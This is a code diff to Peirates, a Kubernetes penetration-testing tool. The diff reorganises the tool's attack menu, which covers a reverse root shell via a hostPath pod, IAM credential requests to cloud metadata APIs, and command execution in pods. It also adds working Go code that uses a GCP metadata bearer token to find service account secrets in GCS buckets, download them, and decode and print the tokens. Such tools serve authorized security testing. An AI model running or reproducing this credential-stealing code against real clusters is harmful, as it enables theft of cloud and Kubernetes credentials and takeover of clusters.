@@ -849,8 +849,8 @@ func banner(connectionString ServerInfo) {
 ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
 ________________________________________
 
-   Peirates v1.0.10 by InGuardians
-   https://www.inguardians.com/labs/
+   Peirates v1.0.11 by InGuardians
+	 https://www.inguardians.com/peirates
 
 ----------------------------------------------------------------`)
 
@@ -924,40 +924,42 @@ Namespaces, Service Accounts and Roles |
 [2] List and/or change namespaces
 [3] Get list of pods
 [4] Get complete info on all pods (json)
+[10] Check all pods for volume mounts
+
+-------------------------+
+Steal Service Accounts   |
+-------------------------+
 [5] Get list of secrets
 [6] Get a service account token from a secret
-[7] Get a list of roles for this service account [not yet implemented]
-[8] Get a list of roles available on the cluster [implemented but not connected to menu]
-[9] Get a list of abilities for a role [not yet implemented]
-----------------------------------------------------------------
-Vulnerabilities and Misconfiguration Searching |
------------------------------------------------+
-[10] Check all pods for volume mounts
-[11] Gain a reverse rootshell by launching a hostPath / pod
-[12] Request list of pods from a Kubelet [not yet implemented]
-------------------------------------------------+
-Cloud-specific Credential Gathering             |
-------------------------------------------------+
 [13] Request IAM credentials from AWS Metadata API [AWS only]
 [14] Request IAM credentials from GCP Metadata API [GCP only]
 [15] Request kube-env from GCP Metadata API [GCP only]
-[16] Pull Kubernetes service account tokens from S3 [AWS only] [not yet implemented]
-[17] Pull Kubernetes service account tokens from GCS [GCP only] [not yet implemented]
-------+
-Pivot |
-------+
-[20] List service accounts acquired [not yet implemented]
-[21] Switch to an acquired service account [not yet implemented]
+[17] Pull Kubernetes service account tokens from GCS [GCP only] 
+-----------+
+Compromise |
+-----------+
+[11] Gain a reverse rootshell by launching a hostPath / pod
 [30] Run command in one or all pods in this namespace 
 [33] Run a command in a pod via a Kubelet [not yet implemented]
+
 -----+
 Misc |
 -----+
-[98] Shell out to bash (not yet implemented)
-[99] Build YAML Files (not yet implemented)
 [exit] Exit Peirates 
 ----------------------------------------------------------------
 Peirates:># `)
+
+		banner_items_removed := (`
+[7] Get a list of roles for this service account [not yet implemented]
+[8] Get a list of roles available on the cluster [implemented but not connected to menu]
+[9] Get a list of abilities for a role [not yet implemented]
+[12] Request list of pods from a Kubelet [not yet implemented]
+[16] Pull Kubernetes service account tokens from S3 [AWS only] [not yet implemented]
+[98] Shell out to bash (not yet implemented)
+[99] Build YAML Files (not yet implemented)
+
+		`)
+		banner_items_removed = banner_items_removed + " "
 
 		var input string
 		var user_response string
@@ -1250,9 +1252,9 @@ Peirates:># `)
 			break
 
 		// [16] Pull Kubernetes service account tokens from S3 [AWS only]
-		case "16":
+		case "17":
 			// Create a new HTTP client that uses the correct headers
-			client := &http.Client{}
+			// client := &http.Client{}
 
 			// curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 			// curl http://169.254.169.254/latest/meta-data/iam/security-credentials/masters.cluster.bustakube.com
@@ -1272,29 +1274,10 @@ Peirates:># `)
 			// Date: date
 			// Authorization: authorization string (see Authenticating Requests (AWS Signature Version 4))
 
-			// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers
-			req_kube, err := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", nil)
-			req_kube.Header.Add("Metadata-Flavor", "Google")
-			resp, err := client.Do(req_kube)
-			if err != nil {
-				println("Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
-			}
-			defer resp.Body.Close()
-			body, err := ioutil.ReadAll(resp.Body)
-			if resp.StatusCode != 200 {
-				fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", resp.StatusCode)
-				break
-			}
-			lines := strings.Split(string(body), "\n")
-			for _, line := range lines {
-				println(line)
-			}
-
 			break
 
-		// [17] Pull Kubernetes service account tokens from GCS [GCP only] [not yet implemented]
-		case "17":
-			break
+		// [16] Pull Kubernetes service account tokens from GCS [GCP only] [not yet implemented]
+		case "16":
 
 			token := GetGCPBearerTokenFromMetadataAPI("default")
 			if token == "ERROR" {
@@ -1357,7 +1340,6 @@ Peirates:># `)
 			for _, line := range bucket_urls {
 				println("Checking bucket for credentials: ", line)
 				url_list_objects := line + "/o"
-				println("Trying URL", url_list_objects)
 				req_list_objects, err := http.NewRequest("GET", url_list_objects, nil)
 				req_list_objects.Header.Add("Metadata-Flavor", "Google")
 				bearer_token := "Bearer " + token
@@ -1370,19 +1352,63 @@ Peirates:># `)
 					resp_list_objects.Body.Close()
 					break
 				}
+				if resp_list_objects.StatusCode != 200 {
+					fmt.Printf("[-] Attempt to get bucket contents failed with status code %d\n", resp_list_objects.StatusCode)
+					break
+				}
+
 				defer resp_list_objects.Body.Close()
-				body_list_objects, err := ioutil.ReadAll(resp_list_buckets.Body)
+				body_list_objects, err := ioutil.ReadAll(resp_list_objects.Body)
 				object_list_lines := strings.Split(string(body_list_objects), "\n")
 
-				// print each bucket list line - later we'll inspect for useful stuff.
+				// Run through the object data, finding selfLink lines with URL-encoded /secrets/ in them.
 				for _, line := range object_list_lines {
-					println("-", line)
+					if strings.Contains(line, "selfLink") {
+						if strings.Contains(line, "%2Fsecrets%2F") {
+							object_url := strings.Split(line, "\"")[3]
+							// Find the substring that tells us this service account token's name
+							start := strings.LastIndex(object_url, "%2F") + 3
+							service_account_name := object_url[start:]
+							println("Getting service account for ", service_account_name)
+
+							// Get the contents of the bucket to get the service account token
+							sa_token_url := object_url + "?alt=media"
+
+							req_token, err := http.NewRequest("GET", sa_token_url, nil)
+							req_token.Header.Add("Metadata-Flavor", "Google")
+							req_token.Header.Add("Authorization", bearer_token)
+							req_token.Header.Add("Accept", "json")
+							resp_token, err := ssl_client.Do(req_token)
+							if err != nil {
+								log.Fatal(err)
+								fmt.Printf("Error - could not perform request --%s--\n", sa_token_url)
+								resp_token.Body.Close()
+								break
+							}
+							if resp_token.StatusCode != 200 {
+								fmt.Printf("[-] Attempt to get object contents failed with status code %d\n", resp_token.StatusCode)
+								break
+							}
+
+							defer resp_token.Body.Close()
+							body_token, err := ioutil.ReadAll(resp_token.Body)
+							token_lines := strings.Split(string(body_token), "\n")
+							for _, line := range token_lines {
+								// Now parse this line to get the token
+								encoded_token := strings.Split(line, "\"")[3]
+								token, err := base64.StdEncoding.DecodeString(encoded_token)
+								if err != nil {
+									println("Could not decode token.")
+								} else {
+									println(string(token))
+								}
+
+							}
+
+						}
+					}
 				}
 			}
-
-			// Run through the object list, finding those with /secret in them.  While URL-encoding each object, appending ?alt=media to get the contents.
-
-			// Each of these objects is a service account token - display
 
 			//
 			// Don't forget to base64 decode with base64.StdEncoding.DecodeString()
